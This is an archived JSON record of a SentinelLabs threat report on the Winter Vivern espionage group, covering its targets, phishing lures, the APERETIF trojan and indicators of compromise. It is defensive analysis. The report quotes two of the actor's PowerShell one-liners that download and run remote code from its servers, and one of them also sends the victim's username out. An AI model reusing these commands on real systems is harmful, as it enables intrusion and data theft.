{
    "id": "81ffc50d-f829-4a68-bf3b-48c9a904a082",
    "created_at": "2023-04-05T02:09:07.062578Z",
    "updated_at": "2025-03-27T02:16:17.367599Z",
    "deleted_at": null,
    "sha1_hash": "593c56df1bc6b837b9d3393309c37b823503aad8",
    "title": "2023-03-16 - Winter Vivern - Uncovering a Wave of Global Espionage",
    "authors": "",
    "file_creation_date": "2023-04-03T08:31:59Z",
    "file_modification_date": "2023-04-03T08:31:59Z",
    "file_size": 2248894,
    "plain_text": "# Winter Vivern | Uncovering a Wave of Global Espionage\n\n**sentinelone.com/labs/winter-vivern-uncovering-a-wave-of-global-espionage/**\n\nTom Hegel\n\n## Executive Summary\n\nSentinelLabs has conducted an investigation into Winter Vivern Advanced Persistent Threat (APT) activity, leveraging\nobservations made by The Polish CBZC and Ukraine CERT. Our research has uncovered a previously unknown set of\nespionage campaigns and targeting activities conducted by this threat actor.\nOur analysis indicates that Winter Vivern’s activities are closely aligned with global objectives that support the interests\nof Belarus and Russia’s governments. The APT has targeted a variety of government organizations, and in a rare\ninstance, a private telecommunication organization.\nThe threat actor employs various tactics, such as phishing websites, credential phishing, and deployment of malicious\ndocuments, that are tailored to the targeted organization’s specific needs. This results in the deployment of custom\nloaders and malicious documents, which enable unauthorized access to sensitive systems and information.\n\n## Background on Winter Vivern\n\nThe Winter Vivern Advanced Persistent Threat (APT) is a noteworthy yet relatively underreported group that operates with\n[pro-Russian objectives. DomainTools initially publicized the group in early 2021, naming it based on an initial command-and-](https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs/)\ncontrol beacon URL string “wintervivern,” which is no longer in use. Subsequently, [Lab52 shared additional analysis several](https://lab52.io/blog/winter-vivern-all-summer/)\nmonths later, identifying new activity associated with Winter Vivern.\n\nThe group has avoided public disclosure since then, until recent attacks targeting Ukraine. A part of a Winter Vivern\n[campaign was reported in recent weeks by the Polish CBZC, and then the](https://cbzc.policja.gov.pl/bzc/aktualnosci/123,Cyberprzestepcy-podszywaja-sie-pod-CBZC.html) [Ukraine CERT as UAC-0114. In this activity,](https://cert.gov.ua/article/3761023)\nCERT-UA and the CBZC collaborated on the release of private technical details which assisted in our research to identify a\nwider set of activity on the threat actor, in addition to new victims and previously unknown specific technical details. Overall,\nwe find that the Winter Vivern APT is a resource-limited but highly creative group that shows restraint in the scope of their\nattacks. Our analysis indicates that Winter Vivern activity aligns closely with global objectives that support the interests of\nBelarus and Russia’s governments.\n\n## Targeted Organizations\n\nOur analysis of Winter Vivern’s past activity indicates that the APT has targeted various government organizations since\n2021, including those in Lithuania, India, Vatican, and Slovakia.\n\nRecently linked campaigns reveal that Winter Vivern has targeted Polish government agencies, the Ukraine Ministry of\nForeign Affairs, the Italy Ministry of Foreign Affairs, and individuals within the Indian government. Of particular interest is the\nAPT’s targeting of private businesses, including telecommunications organizations that support Ukraine in the ongoing war.\n\nThe threat actor’s targeting of a range of government and private entities highlights the need for increased vigilance as their\noperations include a global set of targets directly and indirectly involved in the war.\n\n## Luring Methodology\n\nWinter Vivern’s tactics have included the use of malicious documents, often crafted from authentic government documents\npublicly available or tailored to specific themes. More recently, the group has utilized a new lure technique that involves\nmimicking government domains to distribute malicious downloads.\n\nIn early 2023, Winter Vivern targeted specific government websites by creating individual pages on a single malicious\ndomain that closely resembled those of Poland’s Central Bureau for Combating Cybercrime, the Ukraine Ministry of Foreign\nAffairs, and the Security Service of Ukraine.\n\n\n-----\n\nMalicious Page Mimicking cbzc.policja.gov.pl\nIn mid 2022 the attackers also made an interesting, lesser observed, use of government email credential phishing\nwebpages. One example is ocspdep[.]com, which was used in targeting users of the Indian government’s legitimate email\nservice email.gov.in.\n\n\n-----\n\n_email.gov.in Login Page_\nLooking back at less recent activity, we can see in December 2022 the group likely targeted individuals associated with the\n```\nHochuzhit.com (“I Want to Live”) project, the Ukraine government website offering guidance and instructions to Russian and\n\n```\nBelarus Armed Forces seeking to voluntarily surrender in the war. In these attacks the threat actor made use of a macroenabled Excel spreadsheet to infect the target.\n\nWhen the threat actor seeks to compromise the organization beyond the theft of legitimate credentials, Winter Vivern tends\nto rely on shared toolkits, and the abuse of legitimate Windows tools.\n\n## View Into The Arsenal\n\nWinter Vivern APT falls into a category of scrappy threat actors, being quite resourceful and able to accomplish a lot with\npotentially limited resources while willing to be flexible and creative in their approach to problem-solving.\n\nRecent campaigns demonstrate the group’s use of lures to initiate the infection process, utilizing batch scripts disguised as\nvirus scanners to prompt downloads of malware from attacker-controlled servers.\n\n\n-----\n\nFake Virus Scan Loaders\nIn the case of malicious documents, such as the Hochu Zhit themed XLS files, PowerShell is called through a macro.\nSpecifically, Invoke-Expression cmdlet is executed, beaconing to the malicious destination of ocs```\nromastassec[.]com/goog_comredira3cf7ed34f8.php.\npowershell.exe -noexit -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};\n\niex (new-object net.webclient).DownloadString('hxxps://ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php')\"\n\n\n```\nOne malware family of recent activity is APERETIF, named by CERT-UA based on the development PDB path inside the\nsample. We identified a related sample following similar use, although it is less complete in malicious design. These samples\nalign with the theme of attacks mimicking a virus scanner, presenting users with the fake scan results similar to the script\nloaders. Known samples are PE32 executables, written in Visual C++, with a compilation timestamp of May 2021. We\nassess the threat actor shifted from these original executables to the delivery of batch files with PowerShell scripting, with\noverlap in their use.\n\nf39b260a9209013d9559173f12fbc2bd5332c52a C:\\Users\\user_1\\source\\repos\\Aperitivchick\\Release\\SystemProtector.pdb\n\na19d46251636fb46a013c7b52361b7340126ab27 C:\\Users\\user_1\\source\\repos\\Aperitivchick\n2\\Release\\SystemProtector.pdb\n\nAPERETIF is a trojan, automating the collection of victim details, maintaining access, and beaconing outbound the actorcontrolled domain marakanas[.]com. As with the previous script, the trojan makes use of whomami within PowerShell in its\ninitial activity to beacon outbound for further instructions and/or downloads.\n```\nactor-controlled.exe -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n\n$a=whoami;\n\niex (New-Object Net.WebClient).DownloadString(\"\"\"hxxps://marakanas[.]com/Kkdn7862Jj6h2oDASGmpqU4Qq4q4.php?\nidU=$a\"\"\")\"\n\n\n```\nAPERETIF also uses the signatures.php?id=1 URI through HTTPS GET requests. The group made use of compromised\nWordPress websites to host the malware, such as with hxxps://applesaltbeauty[.]com/wordpress/wp```\nincludes/widgets/classwp/521734i and hxxps://natply[.]com/wordpress/wp-includes/fonts/ch/097214o serving as\n\n```\nthe download location for APERETIF during initial attack stages.\n\nMoreover, Winter Vivern employs other intrusion techniques, such as exploiting application vulnerabilities to compromise\nspecific targets or staging servers. An attacker-controlled server was found to host a login page for the Acunetix web\napplication vulnerability scanner, which may serve as a supplementary resource for scanning target networks and potentially\n\n\n-----\n\nused to compromise WordPress sites for malware hosting purposes.\n\nAcunetix Vulnerability Scanner Login\n\n## Conclusion\n\nThe Winter Vivern cyber threat actor, whose operations of espionage have been discussed in this research, has been able to\nsuccessfully carry out their attacks using simple yet effective attack techniques and tools. Their ability to lure targets into the\nattacks, and their targeting of governments and high-value private businesses demonstrate the level of sophistication and\nstrategic intent in their operations. The dynamic set of TTPs and their ability to evade the public eye has made them a\nformidable force in the cyber domain.\n\n## Indicators of Compromise\n\n**Type** **Indicator**\n\nDomain bugiplaysec[.]com\n\n\n-----\n\nDomain marakanas[.]com\n\nDomain [[email protected][.]com](https://www.sentinelone.com/cdn-cgi/l/email-protection)\n\nDomain ocs-romastassec[.]com\n\nDomain ocspdep[.]com\n\nDomain security-ocsp[.]com\n\nDomain troadsecow[.]com\n\nURL hxxps://applesaltbeauty[.]com/wordpress/wp-includes/widgets/classwp/521734i\n\nURL hxxps://marakanas[.]com/Kkdn7862Jj6h2oDASGmpqU4Qq4q4.php\n\nURL hxxps://natply[.]com/wordpress/wp-includes/fonts/ch/097214o\n\nURL hxxps://ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php\n\nIP 176.97.66[.]57\n\nIP 179.43.187[.]175\n\nIP 179.43.187[.]207\n\nIP 195.54.170[.]26\n\nIP 80.79.124[.]135\n\nFile SHA1 0fe3fe479885dc4d9322b06667054f233f343e20\n\nFile SHA1 83f00ee38950436527499769db5c7ecb74a9ea41\n\nFile SHA1 a19d46251636fb46a013c7b52361b7340126ab27\n\nFile SHA1 a574c5d692b86c6c3ee710af69fccbb908fe1bb8\n\nFile SHA1 c7fa6727fe029c3eaa6d9d8bd860291d7e6e3dd0\n\nFile SHA1 f39b260a9209013d9559173f12fbc2bd5332c52a\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-16 - Winter Vivern - Uncovering a Wave of Global Espionage.pdf"
    ],
    "report_names": [
        "2023-03-16 - Winter Vivern - Uncovering a Wave of Global Espionage.pdf"
    ],
    "threat_actors": [
        {
            "id": "23226bab-4c84-4c65-a8d1-7ac10c44b172",
            "created_at": "2023-04-27T02:04:45.463683Z",
            "updated_at": "2025-03-27T02:02:10.213835Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "TA473",
                "TAG-70",
                "UAC-0114",
                "UNC4907"
            ],
            "source_name": "ETDA:Winter Vivern",
            "tools": [
                "APERETIF"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e6704f3c-15d7-4e1d-b5a8-e33e7e9bd925",
            "created_at": "2023-11-04T02:00:07.660461Z",
            "updated_at": "2025-03-27T02:00:03.14916Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "UAC-0114",
                "TA473",
                "TAG-70",
                "TA-473"
            ],
            "source_name": "MISPGALAXY:Winter Vivern",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a20598c1-894c-4173-be6e-64a1ce9732bd",
            "created_at": "2024-11-01T02:00:52.652891Z",
            "updated_at": "2025-03-27T02:00:55.484584Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "Winter Vivern",
                "TA473",
                "UAC-0114"
            ],
            "source_name": "MITRE:Winter Vivern",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1680660547,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1680510719,
    "ts_modification_date": 1680510719,
    "files": {
        "pdf": "https://archive.orkl.eu/593c56df1bc6b837b9d3393309c37b823503aad8.pdf",
        "text": "https://archive.orkl.eu/593c56df1bc6b837b9d3393309c37b823503aad8.txt",
        "img": "https://archive.orkl.eu/593c56df1bc6b837b9d3393309c37b823503aad8.jpg"
    }
}